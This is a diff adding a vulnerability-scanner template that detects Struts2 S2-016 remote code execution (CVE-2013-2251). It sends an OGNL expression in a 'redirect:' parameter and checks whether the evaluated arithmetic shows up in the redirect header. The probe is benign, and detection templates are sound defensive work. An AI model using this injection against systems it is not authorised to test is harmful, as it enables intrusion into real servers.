@@ -1,0 +1,23 @@
+id: s2-016
+type: default
+info:
+  name: Struts2 s2-016 远程代码执行
+  risk: High
+  cve: CVE-2013-2251
+
+variables: |+
+  function main() {
+  var ext = getFileExt('{{.URL.Path}}');
+  if (['.action','.do','.jsp'].indexOf(ext) > -1) {
+      return {'num1': randomNum(1,1000), 'num2': randomNum(2,1000)};
+    }
+  }
+
+requests:
+  - method: POST
+    redirect: false
+    url: '{{.URL.Scheme}}://{{.URL.Host}}{{.URL.Path}}'
+    body: 'redirect:${ {{.num1}}-{{.num2}} }'
+    matchers:
+      - dsl:
+          - "status_code==302 && contains(Location,itoa({{.num1}}-{{.num2}}))"
